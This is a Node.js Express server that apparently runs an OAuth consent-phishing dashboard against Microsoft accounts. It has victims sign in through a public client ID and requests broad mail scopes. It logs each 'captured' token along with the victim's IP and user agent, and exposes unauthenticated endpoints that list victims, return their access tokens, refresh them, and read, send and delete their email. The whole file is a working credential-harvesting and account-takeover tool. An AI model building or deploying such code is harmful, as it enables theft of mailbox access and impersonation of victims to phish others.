const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Microsoft OAuth Configuration - Using public client
const MICROSOFT_CONFIG = {
    clientId: '1950a258-227b-4e31-a9cf-717495945fc2',
    redirectUri: `https://greatness-dashboard.onrender.com/auth/callback`,
    authorizationEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
    tokenEndpoint: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    scopes: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
};

let userSessions = new Map();
let pendingAuthRequests = new Map();

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// Start OAuth flow - This shows the consent screen
app.get('/api/auth/start', (req, res) => {
    const state = crypto.randomBytes(32).toString('hex');
    const sessionId = crypto.randomBytes(32).toString('hex');
    const clientIp = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Store pending request
    pendingAuthRequests.set(state, {
        sessionId,
        ip: clientIp,
        userAgent: userAgent,
        createdAt: Date.now()
    });
    
    // Build authorization URL with proper parameters
    const authUrl = `${MICROSOFT_CONFIG.authorizationEndpoint}?` +
        `client_id=${MICROSOFT_CONFIG.clientId}&` +
        `response_type=code&` +
        `redirect_uri=${encodeURIComponent(MICROSOFT_CONFIG.redirectUri)}&` +
        `scope=${encodeURIComponent(MICROSOFT_CONFIG.scopes)}&` +
        `state=${state}&` +
        `response_mode=query&` +
        `prompt=select_account`;
    
    res.json({ authUrl, sessionId });
});

// Callback after user consents and signs in
app.get('/auth/callback', async (req, res) => {
    const { code, state, error, error_description } = req.query;
    
    if (error) {
        console.error('Auth error:', error, error_description);
        return res.send(`
            <html>
            <body style="font-family: Arial; text-align: center; padding: 50px;">
                <h2>❌ Authentication Failed</h2>
                <p>${error_description || error}</p>
                <button onclick="window.close()">Close Window</button>
            </body>
            </html>
        `);
    }
    
    const pendingRequest = pendingAuthRequests.get(state);
    if (!pendingRequest) {
        return res.send('<h2>Invalid state parameter</h2>');
    }
    
    try {
        // Exchange code for tokens
        const tokenResponse = await axios.post(MICROSOFT_CONFIG.tokenEndpoint,
            new URLSearchParams({
                client_id: MICROSOFT_CONFIG.clientId,
                code: code,
                redirect_uri: MICROSOFT_CONFIG.redirectUri,
                grant_type: 'authorization_code',
                scope: MICROSOFT_CONFIG.scopes
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = tokenResponse.data;
        
        // Get user info
        const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
            headers: { 'Authorization': `Bearer ${tokens.access_token}` }
        });
        
        const session = {
            sessionId: pendingRequest.sessionId,
            email: userInfo.data.mail || userInfo.data.userPrincipalName,
            displayName: userInfo.data.displayName,
            userId: userInfo.data.id,
            ip: pendingRequest.ip,
            userAgent: pendingRequest.userAgent,
            tokens: {
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000)
            },
            createdAt: new Date().toISOString(),
            lastActive: new Date().toISOString()
        };
        
        userSessions.set(pendingRequest.sessionId, session);
        pendingAuthRequests.delete(state);
        
        console.log(`✅ TOKEN CAPTURED for ${session.email}`);
        
        // Send success page that closes popup
        res.send(`
            <html>
            <head>
                <style>
                    body { font-family: 'Segoe UI', Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; }
                    .success { background: #10b981; padding: 20px; border-radius: 10px; display: inline-block; }
                    button { background: white; color: #333; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 20px; }
                </style>
            </head>
            <body>
                <div class="success">
                    <h2>✅ Authentication Successful!</h2>
                    <p>Your session has been captured.</p>
                    <p>You can now close this window.</p>
                    <button onclick="window.close()">Close Window</button>
                </div>
                <script>
                    setTimeout(() => window.close(), 3000);
                </script>
            </body>
            </html>
        `);
        
    } catch (err) {
        console.error('Token exchange error:', err.response?.data || err.message);
        res.send(`
            <html>
            <body>
                <h2>❌ Error</h2>
                <p>Failed to get tokens. Please try again.</p>
                <button onclick="window.close()">Close</button>
            </body>
            </html>
        `);
    }
});

// Check if session is captured
app.get('/api/auth/status/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (session) {
        res.json({ status: 'approved', email: session.email, sessionId: session.sessionId });
    } else {
        res.json({ status: 'pending' });
    }
});

// Get all sessions for dashboard
app.get('/api/sessions', async (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        displayName: s.displayName,
        ip: s.ip,
        userAgent: s.userAgent,
        lastActive: s.lastActive,
        createdAt: s.createdAt
    }));
    res.json({ sessions });
});

// Get token for session
app.get('/api/session/token/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        expiresAt: session.tokens.expires_at,
        token: {
            access_token: session.tokens.access_token,
            refresh_token: session.tokens.refresh_token ? session.tokens.refresh_token.substring(0, 50) + '...' : 'N/A'
        }
    });
});

// Refresh token
async function refreshToken(session) {
    try {
        const response = await axios.post(MICROSOFT_CONFIG.tokenEndpoint,
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.tokens.refresh_token,
                client_id: MICROSOFT_CONFIG.clientId
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.tokens.access_token = response.data.access_token;
        session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
        session.tokens.expires_in = response.data.expires_in;
        session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
        session.lastActive = new Date().toISOString();
        
        return session.tokens.access_token;
    } catch (err) {
        return null;
    }
}

async function getValidToken(session) {
    if (Date.now() >= session.tokens.expires_at - 300000) {
        return await refreshToken(session);
    }
    return session.tokens.access_token;
}

// Get emails
app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
    const { sessionId, folderId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const folderMap = { 'inbox': 'inbox', 'sent': 'sentitems', 'drafts': 'drafts', 'deleted': 'deleteditems' };
        const folderPath = folderMap[folderId] || folderId;
        
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

// Get single email
app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

// Send email
app.post('/api/mail/send/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { to, subject, body } = req.body;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// Delete email
app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

// Clear all sessions
app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
});
